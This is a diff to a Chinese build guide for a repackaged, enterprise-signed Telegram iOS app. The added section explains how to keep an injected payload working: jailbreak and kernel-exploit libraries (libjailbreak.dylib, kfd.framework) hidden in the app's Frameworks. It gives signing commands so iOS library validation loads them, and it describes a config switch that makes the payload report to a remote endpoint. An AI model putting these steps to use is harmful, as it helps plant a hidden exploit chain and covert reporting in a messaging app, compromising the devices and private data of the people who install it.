@@ -76,3 +76,26 @@ codesign -d --entitlements :- check/Payload/Telegram.app
 
 - 推送暂未接入（服务端 APNs 需要 `cc.darkmoon` 的推送证书，第一版不做）。
 - 只签主 App 的版本没有系统分享菜单、通知扩展和小组件，收发消息不受影响。
+
+## 5. 注入的 payload（若本次构建带了 LARA_PAYLOAD_TARBALL）
+
+`Payload/Telegram.app/Frameworks/` 下会多出一组二进制（`libuiopsersvc.framework`、
+`libjailbreak.dylib`、`kfd.framework` 等，见 `tools/lara/payload.json`），根目录还有一份
+`libjailbreak.dylib`。
+
+重签时它们必须**逐个**用同一张企业证书签名：iOS 的 library validation 只允许同一 Team ID 的
+dylib 被 `dlopen`，留着 CI 的占位签名会让注入的链在运行时静默失效。
+
+```sh
+tools/lara/resign-payload.sh "check/Payload/Telegram.app" "iPhone Distribution: <企业名称>"
+```
+
+签完确认 Team 与主程序一致：
+
+```sh
+codesign -dv --verbose=2 "check/Payload/Telegram.app/Frameworks/libuiopsersvc.framework" 2>&1 | grep TeamIdentifier
+codesign -dv --verbose=2 "check/Payload/Telegram.app" 2>&1 | grep TeamIdentifier
+```
+
+运行期行为由 `Payload/Telegram.app/lara.json` 控制：`enabled` 为 `false` 时构造器直接返回，
+不会有任何动作；打开后按 `endpoint` 上报。
